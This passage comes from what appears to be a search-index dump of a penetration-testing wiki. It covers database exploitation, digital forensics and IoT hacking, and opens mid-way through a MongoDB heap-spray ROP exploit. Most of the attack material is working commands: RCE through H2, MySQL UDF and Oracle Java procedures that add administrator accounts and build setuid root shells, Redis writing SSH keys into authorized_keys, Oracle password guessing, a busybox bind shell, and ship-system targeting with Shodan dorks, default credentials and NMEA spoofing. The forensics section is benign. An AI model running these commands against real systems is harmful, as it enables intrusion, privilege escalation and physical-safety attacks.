chunk2+=unescape( %u5a70%u0805 ); } chunk2=chunk2.substring(0,(sizechunk2-ropchain.length)); testarray2=new Array(); for(i=0;i 25000;i++){ testarray2[i]=chunk2+ropchain; } nativeHelper.apply({ x : 0x836e204}, [ A + \\x26\\x18\\x35\\x08 + MongoSploit! + \\x58\\x71\\x45\\x08 + sthack is a nice place to be + \\x6c\\x5a\\x05\\x08 + \\x20\\x20\\x20\\x20 + \\x58\\x71\\x45\\x08 ]); }) References: - https://blog.websecurify.com/2014/08/hacking-nodejs-and-mongodb.html","title":"MongoDB"},{"location":"databases/#microsoft-access","text":"MDB Tools - Read Access databases on *nix: https://github.com/brianb/mdbtools mdb-tables backup.mdb | grep --color = auto user mdb-export backup.mdb tableName","title":"Microsoft Access"},{"location":"databases/#h2","text":"RCE: CREATE \u200b \u200b ALIAS \u200b SHELLEXEC \u200b AS \u200b $$ \u200b String \u200b shellexec ( \u200b String \u200b cmd ) throws java . io . IOException { java . util . Scanner s = \u200b new java . util . Scanner ( Runtime . getRuntime (). exec ( cmd ). getInputStream ()). useDelim iter ( \u200b \\\\A \u200b ); return s . hasNext () ? s . next () : ; }$$ ; CALL \u200b SHELLEXEC ( \u200b id \u200b )","title":"H2"},{"location":"databases/#redis","text":"Redis-tools: sudo apt - get install redis - tools http://antirez.com/news/96 Connect and basic query: redis-cli -h 10 .10.10.160 10 .10.10.160:6379 dbsize ( integer ) 0 ( 0 .51s ) 10 .10.10.160:6379 CONFIG GET databases 1 ) databases 2 ) 16 ( 0 .63s ) 10 .10.10.160:6379 INFO keyspace # Keyspace ( 0 .56s ) 10 .10.10.160:6379 INFO Write to authorized_keys file: ssh-keygen -f redis echo -ne \\n\\n public ; cat redis.pub public redis-cli -h 10 .10.10.160 SLAVEOF NO ONE cat public | redis-cli -h 10 .10.10.160 -x set pub redis-cli -h 10 .10.10.160 CONFIG SET dir /var/lib/redis/.ssh redis-cli -h 10 .10.10.160 CONFIG SET dbfilename authorized_keys redis-cli -h 10 .10.10.160 SAVE","title":"Redis"},{"location":"databases/#sqlte","text":"Dump entire database: sqlite3 some.db .schema schema.sql sqlite3 some.db .dump dump.sql grep -vx -f schema.sql dump.sql data.sql Dump into CSV . mode csv -- use .separator SOME_STRING for something other than a comma. . headers on . out file . csv select * from MyTable ; Insert into SQL: . mode insert target_table_name . out file . sql select * from MyTable ;","title":"Sqlte"},{"location":"databases/#mysql","text":"Bruteforce: hydra - l root - P / path / to / wordlist . txt ( TARGET IP ADDRESS ) mysql Connection tests mysql - h Hostname - u root mysql - h Hostname - u root mysql - h Hostname - u root @ localhost mysql - h Hostname mysql - h Hostname - u @ localhost mysql - u john - phiroshima - e show databases mysql - u john - phiroshima - D webapp - e show tables Configuration files: Windows config.ini my.ini windows\\my.ini winnt\\my.ini /mysql/data/ UNIX /etc/my.cnf /etc/mysql/my.cnf /var/lib/mysql/my.cnf ~/.my.cnf /etc/my.cnf Command history: ~/.mysql.history Log files: connections.log update.log common.log","title":"MySQL"},{"location":"databases/#privilege-escalation","text":"Current access level: mysql select user (); mysql select user , password , create_priv , insert_priv , update_priv , alter_priv , delete_priv , drop_priv from user where user = OUTPUT OF select user() ; Access passwords: mysql use mysql mysql select user , password from user ; Create new user and grant permissions: mysql create user test identified by test ; mysql grant SELECT , CREATE , DROP , UPDATE , DELETE , INSERT on * . * to mysql identified by mysql WITH GRANT OPTION ; Break into shell: mysql \\ ! cat / etc / passwd mysql \\ ! bash","title":"Privilege Escalation"},{"location":"databases/#mysql-root-to-system-root","text":"MySQL Root to System Root with lib_mysqludf_sys for Windows and Linux Take lib from SQLMap and dump it into the server: udf / mysql / linux / 32 / lib_mysqludf_sys . so udf / mysql / linux / 64 / lib_mysqludf_sys . so udf / mysql / windows / 32 / lib_mysqludf_sys . dll udf / mysql / windows / 64 / lib_mysqludf_sys . dll On Windows: USE mysql ; CREATE TABLE npn ( line blob ); INSERT INTO npn values ( load_file ( C://xampplite//htdocs//mail//lib_mysqludf_sys.dll )); SELECT * FROM mysql . npn INTO DUMPFILE c://windows//system32//lib_mysqludf_sys_32.dll ; CREATE FUNCTION sys_exec RETURNS integer SONAME lib_mysqludf_sys_32.dll ; SELECT sys_exec ( net user npn npn12345678 /add ); SELECT sys_exec ( net localgroup Administrators npn /add ); On Linux: use mysql ; create table npn ( line blob ); insert into npn values ( load_file ( /home/npn/lib_mysqludf_sys.so )); select * from npn into dumpfile /usr/lib/lib_mysqludf_sys.so ; create function sys_exec returns integer soname lib_mysqludf_sys.so ; select sys_exec ( id /tmp/out; chown npn.npn /tmp/out ); npn @ pwn : ~ $ cat / tmp / out uid = 0 ( root ) gid = 0 ( root ) groups = 0 ( root ), 1 ( bin ), 2 ( daemon ), 3 ( sys ), 4 ( adm ) // Create a shell , compile it , chmod +s /tmp/shell and get reverse shell #include stdio.h #include sys/types.h #include unistd.h int main ( void ) { setuid ( 0 ); setgid ( 0 ); system ( \u201c / bin / bash \u201d ); } gcc -o /tmp/shell /home/npn/shell.c chmod +s /tmp/shell","title":"MySQL root to system root"},{"location":"databases/#oracle","text":"","title":"Oracle"},{"location":"databases/#rce","text":"Add permissions (sqlPlus required): DECLARE l_schema VARCHAR2 ( 30 ) : = SYSTEM ; BEGIN DBMS_JAVA . grant_permission ( l_schema , java.io.FilePermission , ALL FILES , read ,write, execute, delete ); DBMS_JAVA . grant_permission ( l_schema , SYS:java.lang.RuntimePermission , writeFileDescriptor , ); DBMS_JAVA . grant_permission ( l_schema , SYS:java.lang.RuntimePermission , readFileDescriptor , ); END ; / Java code: CREATE OR REPLACE AND RESOLVE JAVA SOURCE NAMED pwn AS import java . lang . * ; import java . io . * ; public class pwn { public static void cmd ( String command ) throws IOException { Runtime . getRuntime (). exec ( command ); } } ; / Create procedure: CREATE OR REPLACE PROCEDURE pwn_cmd ( p_command IN VARCHAR2 ) AS LANGUAGE JAVA NAME pwn.cmd (java.lang.String) ; / Run command: exec pwn_cmd ( net user trevelyn trevelyn /add ); exec pwn_cmd ( net localgroup Administrators trevelyn /add ); exec pwn_cmd ( cmd.exe /c echo open X.X.X.X C:\\ftp.txt );","title":"RCE"},{"location":"databases/#tools_1","text":"Oracle Database Attack Tool (ODAT) https://github.com/quentinhardy/odat All checks : . / odat . py all - s 10 . 10 . 10 . 82 - p 1521 . / odat . py all - s 10 . 10 . 10 . 82 - d XE - U scott - P tiger Gusss SID : . / odat . py sidguesser - s 10 . 10 . 10 . 82 Guess passwords : . / odat . py passwordguesser - d XE - s 10 . 10 . 10 . 82 - p 1521 -- accounts - file / root / HTB / tools / db / odat / accounts / accounts . txt Guess login : use admin / oracle / oracle_login Upload file : . / odat . py utlfile - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- sysdba -- putFile c : / writeup . exe ~/ HTB / silo / writeup . exe . / odat . py dbmsxslprocessor - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- putFile c: \\\\ inetpub \\\\ wwwroot File-Test.txt /tmp/File-Test.txt Execute file : . / odat . py externaltable - d XE - s 10 . 10 . 10 . 82 - p 1521 - U scott - P tiger -- sysdba -- exec c : / writeup . exe Nmap nmap --script oracle-sid-brute (TARGET IP ADDRESS) -p 1521 oscanner oscanner - s ( TARGET IP ADDRESS )","title":"Tools"},{"location":"databases/#queries","text":"Get all usernames and password: SELECT Username || : || PASSWORD AS credentials FROM DBA_USERS ; DB Version: SELECT * FROM V$VERSION List all tables owned by user: SELECT table_name FROM user_tables ; Get current DB user: SELECT NAME FROM v$database ;","title":"Queries"},{"location":"databases/#references","text":"https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573","title":"References"},{"location":"dfir/","text":"DFIR Linux Disk Deleted files Linux lost + found strings / dev / sdb sudo dcfldd if =/ dev / sdb of =/ home / pi / usb . dd testdisk / home / pi / usb . dd Temp files myfile.txt~ .myfile.txt.swp .myfile.txt.un~ .backup Windows Disk Mount: https://accessdata.com/product-download/ftk-imager-version-4.2.0 Autopsy: http://www.sleuthkit.org/autopsy/ Show attribute ID of NTFS file systems (fls) The Sleuth Kit: http://www.sleuthkit.org/sleuthkit/ NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker SIFT Beginning of partition: mmls Assemble image in raw: ewfmount /mnt/disk1 obtain shadow file information: vshadowinfo -o /mnt/disk1/ewf1 val = partition start value from mmls * 512 Mount shadow: vshadowmount -o /mnt/disk1/ewf1 /mnt/vss mount -o ro,loop /mnt/vss/vss1 /mnt/disk2 Volume serial number Position 0x48 of the BPB (Bios Parameter Block), which is part of the boot sector. $ boot - mount with FTK Imager Or use \"vol\" command https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc781134(v=ws.10) https://www.digital-detective.net/documents/Volume%20Serial%20Numbers.pdf Registry C : \\ Windows \\ system32 \\ config http://www.regxplor.com/ https://ericzimmerman.github.io/#!index. RegRipper - Etracting/parsing information (keys, values, data) from the Registry and presenting it for analysis: https://github.com/keydet89/RegRipper2.8 RECmd - Command line access to the Registry: https://github.com/EricZimmerman/RECmd Timezone: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ TimeZoneInformation Computer Name: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ ComputerName Last Shutdown: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ Windows - ShutdownTime Build Number: HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ NT \\ CurrentVersion \\ CurrentBuildNumber Important Registry Locations Collection: https://www.dfir.training/resources/downloads/windows-registry Important Files $ MFT Master File Table Kind of index of all files on the hard drive https://jmharkness.wordpress.com/2011/01/27/mft-file-reference-number/ All the entries of the MFT have a reference number, composed of the number of the MFT entry (6 bytes) and the sequence number (2 bytes) in hexadecimal. Ref: 0x002E00000000F1AB - MFT entry: 00000000F1AB, Sequence number: 0x002E Can be dumped with: http://malware-hunters.net/all-downloads/ MRU Most Recently Used NTUSER.dat Can be read with RegRipper with the plugin runmru . Pulling the UserAssist, which stores the latest applications, shortcuts and documents opened by the user rip . exe - p userassist - r .. / NTUSER . DAT USN Journal (Update Sequence Number Journal) Keeps a log of the changes that are made in an NTFS volume http://forensicinsight.org/wp-content/uploads/2013/07/F-INSIGHT-Advanced-UsnJrnl-Forensics-English.pdf Extract the log with FTK Imager parse this journal with the NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker C : \\ $ Extend \\ $ UsrJrnl , Logs: C : \\ Windows \\ system32 \\ winevt \\ logs User logins: Each time a session is started the user profile is loaded. This action leaves a record in the Microsoft - Windows - User Profile Service log / Operational . evtx Prefetch: File extensions of interest: http://www.hexacorn.com/blog/2019/02/11/file-extensions-of-interest/ Common Memory Volatility Cheatsheet: https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet.pdf volatility - f example . dmp imageinfo volatility - f example . dmp --profile Win2012R2x64 lsadump volatility - f example . dmp --profile Win2012R2x64 hivelist volatility - f example . dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000 - y is virtual address of SYSTEM hive - s is virtual address of SYSTEM hive CTFs Challenges CTFs: https://aboutdfir.com/challenges-ctfs/ Writeups DEFCON 2018 DFIR CTF - Forensic Challenge (Level 1): https://www.securityartwork.es/2019/01/04/defcon-2018-dfir-ctf-reto-forense-intro-nivel-1/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 2): https://www.securityartwork.es/2019/01/07/defcon-2018-dfir-ctf-reto-forense-nivel-2/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 3): https://www.securityartwork.es/2019/01/08/defcon-2018-dfir-ctf-reto-forense-nivel-3-conclusiones/ DEFCON DFIR CTF 2018\u200a\u2014\u200aLessons Learned: https://medium.com/@monliclican/defcon-dfir-ctf-2018-lessons-learned-890ef781b96c References Books File System Forensic Analysis: https://www.amazon.com/System-Forensic-Analysis-Brian-Carrier-ebook/dp/B000OZ0N9O New References So you want to be a Digital Forensics professional: https://www.peerlyst.com/posts/so-you-want-to-be-a-digital-forensics-professional-calvin-liu?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post Cheatsheets Linux Command Line Forensics and Intrusion Detection Cheat Sheet: https://www.sandflysecurity.com/blog/compromised-linux-cheat-sheet/ \"Hunt Evil: Lateral Movement\": https://www.sans.org/security-resources/posters/dfir/hunt-evil-165?utm_medium=Social utm_source=Twitter utm_content=May+HuntEvil+Registration+Twitter_RSR utm_campaign=DFIR+Poster Windows Forensic Analysis : POSTER: https://www.sans.org/security-resources/posters/windows-forensics-evidence-of/75/download?utm_medium=Social utm_source=Twitter utm_content=June+APAC+WindowsForensics_RSR utm_campaign=DFIR+Poster Advanced Smartphone Forensics : POSTER: https://digital-forensics.sans.org/media/DFIR-Smartphone-Forensics-Poster.pdf","title":"DFIR"},{"location":"dfir/#dfir","text":"","title":"DFIR"},{"location":"dfir/#linux","text":"","title":"Linux"},{"location":"dfir/#disk","text":"","title":"Disk"},{"location":"dfir/#deleted-files","text":"Linux lost + found strings / dev / sdb sudo dcfldd if =/ dev / sdb of =/ home / pi / usb . dd testdisk / home / pi / usb . dd","title":"Deleted files"},{"location":"dfir/#temp-files","text":"myfile.txt~ .myfile.txt.swp .myfile.txt.un~ .backup","title":"Temp files"},{"location":"dfir/#windows","text":"","title":"Windows"},{"location":"dfir/#disk_1","text":"Mount: https://accessdata.com/product-download/ftk-imager-version-4.2.0 Autopsy: http://www.sleuthkit.org/autopsy/ Show attribute ID of NTFS file systems (fls) The Sleuth Kit: http://www.sleuthkit.org/sleuthkit/ NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker SIFT Beginning of partition: mmls Assemble image in raw: ewfmount /mnt/disk1 obtain shadow file information: vshadowinfo -o /mnt/disk1/ewf1 val = partition start value from mmls * 512 Mount shadow: vshadowmount -o /mnt/disk1/ewf1 /mnt/vss mount -o ro,loop /mnt/vss/vss1 /mnt/disk2 Volume serial number Position 0x48 of the BPB (Bios Parameter Block), which is part of the boot sector. $ boot - mount with FTK Imager Or use \"vol\" command https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc781134(v=ws.10) https://www.digital-detective.net/documents/Volume%20Serial%20Numbers.pdf","title":"Disk"},{"location":"dfir/#registry","text":"C : \\ Windows \\ system32 \\ config http://www.regxplor.com/ https://ericzimmerman.github.io/#!index. RegRipper - Etracting/parsing information (keys, values, data) from the Registry and presenting it for analysis: https://github.com/keydet89/RegRipper2.8 RECmd - Command line access to the Registry: https://github.com/EricZimmerman/RECmd Timezone: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ TimeZoneInformation Computer Name: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ ComputerName Last Shutdown: HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ Windows - ShutdownTime Build Number: HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ NT \\ CurrentVersion \\ CurrentBuildNumber Important Registry Locations Collection: https://www.dfir.training/resources/downloads/windows-registry","title":"Registry"},{"location":"dfir/#important-files","text":"$ MFT Master File Table Kind of index of all files on the hard drive https://jmharkness.wordpress.com/2011/01/27/mft-file-reference-number/ All the entries of the MFT have a reference number, composed of the number of the MFT entry (6 bytes) and the sequence number (2 bytes) in hexadecimal. Ref: 0x002E00000000F1AB - MFT entry: 00000000F1AB, Sequence number: 0x002E Can be dumped with: http://malware-hunters.net/all-downloads/ MRU Most Recently Used NTUSER.dat Can be read with RegRipper with the plugin runmru . Pulling the UserAssist, which stores the latest applications, shortcuts and documents opened by the user rip . exe - p userassist - r .. / NTUSER . DAT USN Journal (Update Sequence Number Journal) Keeps a log of the changes that are made in an NTFS volume http://forensicinsight.org/wp-content/uploads/2013/07/F-INSIGHT-Advanced-UsnJrnl-Forensics-English.pdf Extract the log with FTK Imager parse this journal with the NTFS Log Tracker: https://sites.google.com/site/forensicnote/ntfs-log-tracker C : \\ $ Extend \\ $ UsrJrnl , Logs: C : \\ Windows \\ system32 \\ winevt \\ logs User logins: Each time a session is started the user profile is loaded. This action leaves a record in the Microsoft - Windows - User Profile Service log / Operational . evtx Prefetch: File extensions of interest: http://www.hexacorn.com/blog/2019/02/11/file-extensions-of-interest/","title":"Important Files"},{"location":"dfir/#common","text":"","title":"Common"},{"location":"dfir/#memory","text":"Volatility Cheatsheet: https://digital-forensics.sans.org/media/volatility-memory-forensics-cheat-sheet.pdf volatility - f example . dmp imageinfo volatility - f example . dmp --profile Win2012R2x64 lsadump volatility - f example . dmp --profile Win2012R2x64 hivelist volatility - f example . dmp --profile Win2012R2x64 hashdump -y 0xffffc00000028000 -s 0xffffc00000619000 - y is virtual address of SYSTEM hive - s is virtual address of SYSTEM hive","title":"Memory"},{"location":"dfir/#ctfs","text":"Challenges CTFs: https://aboutdfir.com/challenges-ctfs/","title":"CTFs"},{"location":"dfir/#writeups","text":"DEFCON 2018 DFIR CTF - Forensic Challenge (Level 1): https://www.securityartwork.es/2019/01/04/defcon-2018-dfir-ctf-reto-forense-intro-nivel-1/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 2): https://www.securityartwork.es/2019/01/07/defcon-2018-dfir-ctf-reto-forense-nivel-2/ DEFCON 2018 DFIR CTF - Forensic Challenge (Level 3): https://www.securityartwork.es/2019/01/08/defcon-2018-dfir-ctf-reto-forense-nivel-3-conclusiones/ DEFCON DFIR CTF 2018\u200a\u2014\u200aLessons Learned: https://medium.com/@monliclican/defcon-dfir-ctf-2018-lessons-learned-890ef781b96c","title":"Writeups"},{"location":"dfir/#references","text":"","title":"References"},{"location":"dfir/#books","text":"File System Forensic Analysis: https://www.amazon.com/System-Forensic-Analysis-Brian-Carrier-ebook/dp/B000OZ0N9O","title":"Books"},{"location":"dfir/#new-references","text":"So you want to be a Digital Forensics professional: https://www.peerlyst.com/posts/so-you-want-to-be-a-digital-forensics-professional-calvin-liu?utm_source=twitter utm_medium=social utm_content=peerlyst_post utm_campaign=peerlyst_shared_post","title":"New References"},{"location":"dfir/#cheatsheets","text":"Linux Command Line Forensics and Intrusion Detection Cheat Sheet: https://www.sandflysecurity.com/blog/compromised-linux-cheat-sheet/ \"Hunt Evil: Lateral Movement\": https://www.sans.org/security-resources/posters/dfir/hunt-evil-165?utm_medium=Social utm_source=Twitter utm_content=May+HuntEvil+Registration+Twitter_RSR utm_campaign=DFIR+Poster Windows Forensic Analysis : POSTER: https://www.sans.org/security-resources/posters/windows-forensics-evidence-of/75/download?utm_medium=Social utm_source=Twitter utm_content=June+APAC+WindowsForensics_RSR utm_campaign=DFIR+Poster Advanced Smartphone Forensics : POSTER: https://digital-forensics.sans.org/media/DFIR-Smartphone-Forensics-Poster.pdf","title":"Cheatsheets"},{"location":"embedded-and-iot/","text":"Lab Setup RPi as poor man's hardware hacking tool: https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool/ https://systemoverlord.com/static/attachments/iot_toolkit.pdf OSH Stencils: https://www.oshstencils.com Quick Reference Cross Compiling - Compile for MIPS: mips - linux - gnu - gcc bindshell . c - o bindshell - static mips - linux - gnu - strip bindshell ESP Read Flash: esptool . py - p / dev / ttyUSB0 - b 460800 read_flash 0 0 x200000 flash . bin Check Device config: espefuse . py --port /dev/ttyUSB0 summary Binwalk Display information: binwalk - t - vvv example - firmware Extract: binwalk - e - t - vvv example - firmware Entropy Analysis (identity compression / encryption): binwalk - E example - firmware http://www.devttys0.com/2013/06/differentiate-encryption-from-compression-using-math/ Repacking Firmware https://github.com/rampageX/firmware-mod-kit/wiki . / extract - firmware . sh example - firmware . bin . / build - formware . sh Busybox Command Injection: https://www.nccgroup.trust/us/about-us/newsroom-and-events/blog/2010/february/busybox-command-injection/ Bind a telnet shell to port 9999: / bin / busybox telnetd - l / bin / sh - p9999 QMUE Run binaries inside a firmware whereis qemu - mips - static cp / etc / example / qemu - mips - static squashfs - root # From squashfs - root chroot . / . / qemu - mips - static bin / ls Test Scenarios Replaying of sensor communication Pair device with controlling application without authorization Using guessable identifiers for linking WiFi and other credentials stored in flash Techniques Glitching Voltage glitching attacks: https://twitter.com/d_olex/status/1084700474043813895 Side Channel Intel TLBleed: https://www.theregister.co.uk/2018/06/22/intel_tlbleed_key_data_leak/ Collections Searchable FCC ID Database: https://fccid.io/ Command to download all FCC ID documents: https://rehmann.co/blog/command-download-fcc-id-documents/ for i in $ ( seq 3 4200000 ) ; do curl \u2013referer \u2018https://apps.fcc.gov/oetcf/eas/reports/ViewExhibitReport.cfm\u2019 \u2018https://apps.fcc.gov/eas/GetApplicationAttachment.html?calledFromFrame=Y id=\u2019$i -o $i; done Protocols UART / Serial All clock speeds are set independently of the signal baud rate is the rate at which bits will be transmitted (bits per second). There is one start bit. There is one stop bit (a low voltage cycle). 8 data bits in the middle. 1 parity bit at the end of the data. Settings Number of data bits/number of parity bits/number of stop bits 8/N/1 (8N1) means 8 data bits, No parity bit, and 1 stop bit Common Baud Rates 9600 19200 38400 57600 115200 Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware UART to Root [Pending]: https://exfil.co/2019/02/14/uart-to-root-the-harder-way/ SPI MISO - Master In Slave Out - Data flow from the slave units to the master unit MOSI - Master Out Slave In - Data flow from the master unit to the slave units SCLK - The clock signal pin - Rising edge of the clock triggers the level of MISO/MOSI to be read as the current bit by the target device. SS / CS - Slave / Chip Select - Select a device, this pin is grounded, telling the particular device to listen up. VCC / GND Typical https://en.wikipedia.org/wiki/Chip_select Daisy Chained The SPI port of each slave is designed to send out during the second group of clock pulses an exact copy of the data it received during the first group of clock pulses. The whole chain acts as a communication shift register. Daisy chaining is often done with shift registers to provide a bank of inputs or outputs through SPI. Each slave copies input to output in the next clock cycle until active low SS line goes high. SPI mode - is the combination of CPOL and CPHA CPOL - Polarity of the clock CPOL=0 is a clock which idles at 0 - Leading edge is a rising edge - Trailing edge is a falling edge CPOL=1 is a clock which idles at 1 - Leading edge is a falling edge - Trailing edge is a rising edge CPHA - Timing of the data bits relative to the clock pulses CPHA=0 - \"out\" side changes the data on the trailing edge of the preceding clock cycle, while the \"in\" side captures the data on (or shortly after) the leading edge of the clock cycle - First bit must be on the MOSI line before the leading clock edge CPHA=1 - \"out\" side changes the data on the leading edge of the current clock cycle, while the \"in\" side captures the data on (or shortly after) the trailing edge of the clock cycle - For the last cycle, the slave holds the MISO line valid until slave select is deasserted. https://en.wikipedia.org/wiki/Serial_Peripheral_Interface I2C JTAG TDI - Test Data In TDO - Test Data Out - When you daisychain IC\u2019s with JTAG, the TDO of one goes to the TDI of the next, until it loops back to the debug header. TCK - Test Clock - JTAG clock signal, the rising edge triggering a read operation. TCK is not chained, but rather forms a \u2019test clock bus\u2019 along with TMS each IC can see the clock and TMS signals. TMS - Test Mode Select - Read as the clock signal rises, and determines the next state of the internal JTAG controller TRST - Test Reset - An optional pin that can reset the internal test controller, but this isn\u2019t required. Test Access Port (TAP) Controller to handle JTAG commands Minimally 3 registers (instruction register, 2 or more data registers) State-machine that uses the TMS level to decide what to do after each clock cycle TAP controller connects to the boundary cells Boundary Cells can raise/lower a leg\u2019s voltage to influence the behavior of the chip Ref: Pentesting Hardware - A Practical Handbook by Mark C. https://github.com/unprovable/PentestHardware SWD Tools Glasgow = Bus Pirate + Bus Blaster + Logic Sniffer https://github.com/whitequark/Glasgow https://twitter.com/whitequark/status/985040607864176640 https://twitter.com/marcan42/status/1090564121068593153 Cutdown version of starshipraider: https://github.com/azonenberg/starshipraider OpenWRT USB Storage: https://openwrt.org/docs/guide-user/storage/usb-drives https://openwrt.org/docs/guide-user/additional-software/extroot_configuration https://wiki.openwrt.org/doc/howto/usb.storage https://wiki.openwrt.org/doc/howto/extroot FACT - The Firmware Analysis and Comparison Tool: https://fkie-cad.github.io/FACT_core/ Platform Firmware Auditing Tool: https://github.com/PreOS-Security/fwaudit BIOS - https://github.com/chipsec/chipsec Specific ATMs References: ATM LOGIC ATTACKS: SCENARIOS: https://www.ptsecurity.com/upload/corporate/ww-en/analytics/ATM-Vulnerabilities-2018-eng.pdf Automobile Tools: canalyzat0r: https://amp.kitploit.com/2019/02/canalyzat0r-security-analysis-toolkit.html?amp=1 m=1 References: Automobile Hacking, Part 1: The CAN Protocol: https://www.hackers-arise.com/single-post/2017/08/04/Automobile-Hacking-Part-1-The-CAN-Protocol Automobile Hacking, Part 2: The can-utils or SocketCAN: https://www.hackers-arise.com/single-post/2017/08/08/Automobile-Hacking-Part-2-The-can-utils-or-SocketCAN Automobile Hacking, Part 3: Metasploit for Car Hacking: https://www.hackers-arise.com/single-post/2017/10/19/Automobile-Hacking-Part-3-Metasploit-for-Car-Hacking Automobile Hacking, Part 4: How to Hack the Keyless Entry System: https://www.hackers-arise.com/single-post/2018/12/05/Automobile-Hacking-Part-4-How-to-Hack-the-Keyless-Entry-System Awesome Vehicle Security: https://github.com/jaredthecoder/awesome-vehicle-security https://twitter.com/0xcharlie/status/1014892446495305733 Bluetooth References: A Bluetooth low energy capture the flag: https://github.com/hackgnar/ble_ctf My notes on Hacking BLE \u2013 list of resources: https://www.davidsopas.com/my-notes-on-hacking-ble-list-of-resources/ Cameras Tools: Pentax Hacker Development Kit: https://github.com/i-am-shodan/PHDK https://www.dropbox.com/s/ogez7sb4b0cw92g/hacking_pentax_k30.pdf Canon Hack Development Kit: http://chdk.wikia.com/wiki/CHDK Locks **References: ** How to open a Tapplock over BLE in under two seconds: https://www.pentestpartners.com/security-blog/totally-pwning-the-tapplock-smart-lock/ Printers Discovery: Windows SharpPrinter - Discover Printers: https://github.com/rvrsh3ll/SharpPrinter ListNetworks - Enumerate all visible network printers in local network: https://github.com/vinifr/-ListNetworks Linux Praeda - Automated printer data harvesting tool: http://h.foofus.net/?page_id=218 Exploitation: PRET - Printer Exploitation Toolkit: https://github.com/RUB-NDS/PRET praedasploit - https://github.com/MooseDojo/praedasploit Attack Patterns: Plunder Pillage Print: https://hackinparis.com/data/slides/2014/DeralHeilandandPeterArzamendi.pdf LDAP/SMB/SMTP Pass-Back-Attack: http://foofus.net/goons/percx/praeda/pass-back-attack.pdf LDAP - power address book functionality SMB - saving scans to file shares SMTP - scan to email Export configuration and look for credentials LDAP traffic is unencrypted (usually), can MITM Guides: An Introduction to Printer Exploitation: https://0x00sec.org/t/an-introduction-to-printer-exploitation/3565 Ships Shodan Searches: org:\"Inmarsat Solutions US\" Login for Globe wireless title:\"sailor 900\" Sat antenna details Exploit: https://www.exploit-db.com/exploits/35932 Default credentials: admin/1234 html:commbox KVH CommBox terminals Vessel name / network structure leaked \"Show Users\" link (or can request the content by appending /rest.php?action=QCgetActiveUsers) **Tools: ** Vuln Ship Tracker: https://ptp-shiptracker.herokuapp.com/ Terms: ECDIS are the electronic chart systems that are needed to navigate. AIS transceiver - system that ships use to avoid colliding with each other. NMEA 0183 messages Ethernet and serial networks are often \u2018bridged\u2019 at several points (GPS,satcom terminal, ECDIS) OT systems are used to control the steering gear, engines, ballast pumps and lots more. They communicate using NMEA 0183 messages. No message authentication, encryption or validation (only 2 byte XOR checksum) Attack Patterns: Spoof the ECDIS using the vulnerable config interface, 'grow' the ship and 'jump' it in to the shipping lanes. Other ships AIS will alert the ships captain to a collision scenario MitM and change NMEA 0183 messages to read differently Ex: change the rudder command by modifying a GPS autopilot command References: Summarized References: https://www.pentestpartners.com/security-blog/osint-from-ship-satcoms/ https://www.pentestpartners.com/security-blog/hacking-tracking-stealing-and-sinking-ships/ UEFI References: UEFI_EXPLOITATION_MASSES_FINAL: https://github.com/eclypsium/Publications/blob/master/2018/DEFCON26/DC26_UEFI_EXPLOITATION_MASSES_FINAL.pdf Tools: EDK II Project - A modern, feature-rich, cross-platform firmware development environment for the UEFI and PI specifications from www.uefi.org : https://github.com/tianocore/edk2 RaspberryPiPkg - 64-bit Tiano Core UEFI for the Raspberry Pi 3 (with devices, Linux, NetBSD, FreeBSD and Windows on Arm!): https://github.com/andreiw/RaspberryPiPkg uefi-firmware-parser - Parse BIOS/Intel ME/UEFI firmware related structures: Volumes, FileSystems, Files, etc: https://github.com/theopolis/uefi-firmware-parser References New References Twinkly Twinkly Little Star: https://labs.mwrinfosecurity.com/blog/twinkly-twinkly-little-star search for Xiaomi scooters lock unlock the devices: https://github.com/rani-i/Mi365Locker Mass play any YouTube video, terminate apps and rename Chromecast device(s) obtained from Shodan.io: https://github.com/649/Crashcast-Exploit Project Alias is an open-source parasite to train custom wake-up names for smart home devices while disturbing their built-in microphone: https://github.com/bjoernkarmann/project_alias 35C3 - Modchips of the State: https://www.youtube.com/watch?v=C7H3V7tkxeA (BNC backdoor designed to be inserted into a resistor sitting between the SPI flash and the BNC chip) Rooting the FireTV Cube and Pendant with FireFU: https://blog.exploitee.rs/2018/rooting-the-firetv-cube-and-pendant-with-firefu/ Thunderclap https://twitter.com/marcan42/status/1100655030711939072 Summarized References https://limitedresults.com/2019/01/pwn-the-lifx-mini-white/","title":"Embedded and iot"},{"location":"embedded-and-iot/#lab-setup","text":"RPi as poor man's hardware hacking tool: https://payatu.com/using-rasberrypi-as-poor-mans-hardware-hacking-tool/ https://systemoverlord.com/static/attachments/iot_toolkit.pdf OSH Stencils: https://www.oshstencils.com","title":"Lab Setup"},{"location":"embedded-and-iot/#quick-reference","text":"Cross Compiling - Compile for MIPS: mips - linux - gnu - gcc bindshell . c - o bindshell - static mips - linux - gnu - strip bindshell ESP Read Flash: esptool . py - p / dev / ttyUSB0 - b 460800 read_flash 0 0 x200000 flash . bin Check Device config: espefuse . py --port /dev/ttyUSB0 summary Binwalk Display information: binwalk - t - vvv example - firmware Extract: binwalk - e - t - vvv example - firmware Entropy Analysis (identity compression / encryption): binwalk - E example - firmware 